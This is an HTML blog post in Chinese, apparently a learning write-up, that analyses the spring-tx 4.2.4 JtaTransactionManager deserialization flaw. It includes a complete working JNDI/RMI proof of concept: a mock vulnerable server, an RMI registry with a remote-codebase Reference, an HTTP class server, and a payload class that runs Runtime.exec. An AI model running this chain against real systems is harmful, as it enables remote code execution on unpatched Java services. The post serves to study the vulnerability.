@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+<meta name="theme-color" content="#f8f5ec">
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="description" content="spring 4.2.4 反序列化 学习"><meta name="keywords" content="java, ll"><link rel="alternate" href="/default" title="ll"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=2.11.0">
+<link rel="canonical" href="http://yoursite.com/2019/11/11/spring_4.2.4_unser/">
+
+<link rel="stylesheet" type="text/css" href="/lib/fancybox/jquery.fancybox.css"><link rel="stylesheet" type="text/css" href="/lib/nprogress/nprogress.min.css">
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=2.11.0">
+
+<script id="baidu_push">
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<script>
+  window.config = {"leancloud":{"app_id":null,"app_key":null},"toc":true,"fancybox":true,"pjax":true,"latex":false};
+</script>
+
+    <title>spring 4.2.4 反序列化 学习 - ll</title>
+  </head>
+
+  <body><div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/." class="logo">ll</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list"><a href="/">
+        <li class="mobile-menu-item">Home
+          </li>
+      </a><a href="/tags">
+        <li class="mobile-menu-item">Tags
+          </li>
+      </a><a href="/links/">
+        <li class="mobile-menu-item">Links
+          </li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">About
+          </li>
+      </a></ul>
+</nav>
+<div class="container" id="mobile-panel">
+      <header id="header" class="header"><div class="logo-wrapper">
+  <a href="/." class="logo">ll</a>
+</div>
+
+<nav class="site-navbar"><ul id="menu" class="menu"><li class="menu-item">
+          <a class="menu-item-link" href="/">
+            Home
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/tags">
+            Tags
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/links/">
+            Links
+            </a>
+        </li>
+      <li class="menu-item">
+          <a class="menu-item-link" href="/about/">
+            About
+            </a>
+        </li>
+      </ul></nav>
+</header>
+
+      <main id="main" class="main">
+        <div class="content-wrapper">
+          <div id="content" class="content"><article class="post">
+    <header class="post-header">
+      <h1 class="post-title">spring 4.2.4 反序列化 学习
+        </h1>
+
+      <div class="post-meta">
+        <span class="post-time">
+          2019-11-11
+        </span></div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+    <h2 class="post-toc-title">Contents</h2>
+    <div class="post-toc-content">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞分析"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#poc-分析"><span class="toc-text">poc 分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-text">总结</span></a></li></ol>
+    </div>
+  </div><div class="post-content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在上一篇 fastjson 反序列化漏洞的分析中，使用了两种漏洞利用方式，第二种方式中使用了 JNDI 结合 RMI 使 poc 变得更加通用。类似的利用方式可以应用在 spring-tx 4.2.4 的反序列化漏洞中。</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>JNDI 支持的服务类型很多，其中也包含 RMI 服务。在 RMI 服务中，客户端会通过 lookup() 方法向 RMI Registry 请求远程对象的 stub。如果客户端的 lookup() 方法的参数可控，我们可以让客户端向攻击者的 RMI Registry 请求 stub。而请求的远程对象是攻击者可控的，攻击者可以在该 RMI 服务中注册一个 Reference 类型的对象，其中的 classname 和 codebase url 都是可控的。当改变客户端的 lookup() 参数指向该注册对象时，客户端在 classpath 中找不到 classname 指定的类，就会根据 codebase url 和 classname 去加载该类的 class 文件，加载到该类后，会实例化该类。</p>
+<p>根据分析，我们要执行的代码可以写在 Reference 指定的远程类中的如下位置。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 构造方法中</span><br><span class="line">2. 静态代码块中</span><br><span class="line">3. getObjectInstance() 方法中</span><br></pre></td></tr></table></figure>
+
+<p>将要执行的代码放到第三个位置需要远程类实现 ObjectFactory 接口，并实现该接口的 getObjectInstance() 方法，暂未测试。后面分析的 poc 将执行代码写在远程类的构造方法中。</p>
+<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/spring_4.2.4_unser/01.png" alt="01"></p>
+<p>pom.xml</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-tx&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;4.2.4.RELEASE&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-context&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;4.2.4.RELEASE&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;javax.transaction&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;javax.transaction-api&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;1.2&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>
+
+<p>该漏洞发生在 org.springframework.transaction.jta.JtaTransactionManager 类中，该类与 spring 的事务管理相关。</p>
+<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/spring_4.2.4_unser/02.png" alt="02"></p>
+<p>因为是反序列化漏洞，所以我们找到 JtaTransactionManager 类的 readObject() 方法，该方法会在反序列化时被调用。在 idea 中使用 command + f12 定位类中的方法。</p>
+<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/spring_4.2.4_unser/03.png" alt="03"></p>
+<p>JtaTransactionManager 的 readObject() 方法。</p>
+<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/spring_4.2.4_unser/04.png" alt="04"></p>
+<p>跟入 initUserTransactionAndTransactionManager() 方法。</p>
+<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/spring_4.2.4_unser/05.png" alt="05"></p>
+<p>在 php 的反序列化中，我们主要是通过控制对象的属性构造 pop 链，并通过属性构造利用代码。在 java 中也类似，这里的 userTransactionName 就是我们要控制的属性，该值最终会进入 lookup() 方法中，根据前面的分析，我们的目标就是改变受害者的 lookup() 方法中的参数。</p>
+<p>跟入 lookupUserTransaction() 方法。</p>
+<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/spring_4.2.4_unser/06.png" alt="06"></p>
+<p>在 lookupUserTransaction() 方法中，先通过 getJndiTemplate() 方法取出了一开始在 readObject() 方法中创建的 JndiTemplate 的实例，接着调用 JndiTemplate 的 lookup() 方法，并传入了可控的 userTransactionName 属性。</p>
+<p> JndiTemplate 的 lookup() 方法。</p>
+<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/spring_4.2.4_unser/07.png" alt="07"></p>
+<p>在 JndiTemplate 的 lookup() 方法中，先创建了一个匿名内部类，name 参数就是从 lookupUserTransaction() 方法中传来的可控内容。当执行该匿名类的 doInContext() 方法时，会将可控内容传入 InitialContext 的 lookup() 方法中。</p>
+<p>跟入 execute() 方法。</p>
+<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/spring_4.2.4_unser/08.png" alt="08"></p>
+<p>在 execute() 方法中，执行了匿名类的 doInContext() 方法，而其中进入 InitialContext 的 lookup() 方法的参数我们可控，即可以让受害者向我们的 RMI 服务请求远程对象。到这里，漏洞分析就结束了。</p>
+<h2 id="poc-分析"><a href="#poc-分析" class="headerlink" title="poc 分析"></a>poc 分析</h2><p>根据前面的分析，该漏洞虽然是一个反序列化漏洞，但是要实现利用需要结合一个反序列化的接口，即漏洞触发点。在 php 中，如果我们找到一条 pop 链，我们可以通过 phar 等方式触发。所以 poc 中通过模拟一个反序列化接口对该漏洞进行复现。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExploitableServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ServerSocket serverSocket = <span class="keyword">new</span> ServerSocket(<span class="number">9999</span>);</span><br><span class="line">            System.out.println(<span class="string">"Server started on port "</span> + serverSocket.getLocalPort());</span><br><span class="line">            <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">                Socket socket=serverSocket.accept();</span><br><span class="line">                System.out.println(<span class="string">"Connection received from "</span> + socket.getInetAddress());</span><br><span class="line">                ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(socket.getInputStream());</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Object object = objectInputStream.readObject();</span><br><span class="line">                    System.out.println(<span class="string">"Read object "</span>+ object);</span><br><span class="line">                &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">                    System.out.println(<span class="string">"Exception caught while reading object"</span>);</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上面通过监听 9999 端口，将接收到的数据进行反序列化来模拟触发点。下面是攻击者的服务端代码。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SpringPOC</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/***</span></span><br><span class="line"><span class="comment">     * 启动http服务器，提供下载远程要调用的类</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">lanuchCodebaseURLServer</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Starting HTTP server"</span>);</span><br><span class="line">        HttpServer httpServer = HttpServer.create(<span class="keyword">new</span> InetSocketAddress(<span class="number">8000</span>), <span class="number">0</span>);</span><br><span class="line">        httpServer.createContext(<span class="string">"/"</span>, <span class="keyword">new</span> HttpFileHandler());</span><br><span class="line">        httpServer.setExecutor(<span class="keyword">null</span>);</span><br><span class="line">        httpServer.start();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/***</span></span><br><span class="line"><span class="comment">     * 启动RMI服务</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">lanuchRMIregister</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Creating RMI Registry"</span>);</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1999</span>);</span><br><span class="line">        <span class="comment">// 设置code url 这里即为http://http://127.0.0.1:8000/</span></span><br><span class="line">        <span class="comment">// 最终下载恶意类的地址为http://127.0.0.1:8000/ExportObject.class</span></span><br><span class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">"ExportObject"</span>, <span class="string">"ExportObject"</span>, <span class="string">"http://127.0.0.1:8000/"</span>);</span><br><span class="line">        <span class="comment">// Reference包装类</span></span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        registry.bind(<span class="string">"Object"</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/***</span></span><br><span class="line"><span class="comment">     * 发送payload</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sendPayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// jndi的调用地址</span></span><br><span class="line">        String jndiAddress = <span class="string">"rmi://127.0.0.1:1999/Object"</span>;</span><br><span class="line">        <span class="comment">// 实例化JtaTransactionManager对象，并且初始化UserTransactionName成员变量</span></span><br><span class="line">        JtaTransactionManager object = <span class="keyword">new</span> JtaTransactionManager();</span><br><span class="line">        object.setUserTransactionName(jndiAddress);</span><br><span class="line">        <span class="comment">// 发送构造好的payload</span></span><br><span class="line">        Socket socket = <span class="keyword">new</span> Socket(<span class="string">"127.0.0.1"</span>, <span class="number">9999</span>);</span><br><span class="line">        System.out.println(<span class="string">"Sending object to server..."</span>);</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(socket.getOutputStream());</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        socket.close();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        lanuchCodebaseURLServer();</span><br><span class="line">        lanuchRMIregister();</span><br><span class="line">        sendPayload();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>主要思路就是，攻击者需要在服务端开启一个 RMI 服务和一个 web 服务，RMI 服务中注册一个 Reference 对象，web 服务上存放了 Reference 指定的 class 文件。这里的 web 服务是通过 JDK 内置的 HttpServer 类实现的。还需要一个实现 HttpHandler 接口的实现类，该 web 服务会回调实现类的 handle() 方法处理请求。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HttpFileHandler</span> <span class="keyword">implements</span> <span class="title">HttpHandler</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handle</span><span class="params">(HttpExchange httpExchange)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">"new http request from "</span>+ httpExchange.getRemoteAddress() + <span class="string">" "</span> + httpExchange.getRequestURI());</span><br><span class="line">            InputStream inputStream = HttpFileHandler.class.getResourceAsStream(httpExchange.getRequestURI().getPath());</span><br><span class="line">            ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            <span class="keyword">while</span>(inputStream.available()&gt;<span class="number">0</span>) &#123;</span><br><span class="line">                byteArrayOutputStream.write(inputStream.read());</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">byte</span>[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">            httpExchange.sendResponseHeaders(<span class="number">200</span>, bytes.length);</span><br><span class="line">            httpExchange.getResponseBody().write(bytes);</span><br><span class="line">            httpExchange.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>生成放到 web 服务上的 ExportObject.class 文件。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExportObject</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ExportObject</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">"open /Applications/Calculator.app"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ExportObject eo = <span class="keyword">new</span> ExportObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先启动受害者服务器 ExploitableServer.java。再启动攻击者服务器 SpringPOC.java，向受害者的反序列化接口发送利用代码，即可触发漏洞。</p>
+<p><img src="https://raw.githubusercontent.com/LLfam/pictures/master/blog/spring_4.2.4_unser/09.png" alt="09"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>poc 来自参考文章。如有错误，欢迎讨论 : )</p>
+<p>ref : </p>
+<p><code>https://www.iswin.org/2016/01/24/Spring-framework-deserialization-RCE-分析以及利用/</code></p>
+
+      </div>
+      <div class="post-copyright">
+    <p class="copyright-item">
+      <span>Author: </span>
+      <a href="http://yoursite.com">ll</a>
+    </p>
+    <p class="copyright-item">
+      <span>Link: </span>
+      <a href="http://yoursite.com/2019/11/11/spring_4.2.4_unser/">http://yoursite.com/2019/11/11/spring_4.2.4_unser/</a>
+    </p>
+    <p class="copyright-item">
+      <span>License: </span><a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>
+    </p>
+  </div>
+      <footer class="post-footer">
+        <div class="post-tags">
+            <a href="/tags/java/">java</a>
+            </div>
+        
+        <nav class="post-nav"><a class="next" href="/2019/11/06/fastjson_1_2_24/">
+        <span class="next-text nav-default">fastjson 1.2.24 反序列化学习</span>
+        <span class="prev-text nav-mobile">Next</span>
+        <i class="iconfont icon-right"></i>
+      </a>
+    </nav></footer>
+    </article></div><div class="comments" id="comments"></div></div>
+      </main>
+
+      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:your@email.com" class="iconfont icon-email" title="email"></a>
+        <a href="https://github.com/LLfam" class="iconfont icon-github" title="github"></a>
+        <a href="/atom.xml" class="iconfont icon-rss" title="rss"></a>
+    </div><div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://hexo.io/">Hexo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/ahonn/hexo-theme-even">Even</a>
+  </span>
+
+  <span class="copyright-year">&copy;2015 - 2019<span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">ll</span>
+  </span>
+</div>
+</footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div><script type="text/javascript" src="/lib/jquery/jquery.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout.js"></script>
+  <script type="text/javascript" src="/lib/fancybox/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/lib/pjax/jquery.pjax.min.js"></script>
+  <script type="text/javascript" src="/lib/nprogress/nprogress.min.js"></script>
+  <script type="text/javascript" src="/js/src/even.js?v=2.11.0"></script>
+</body>
+</html>
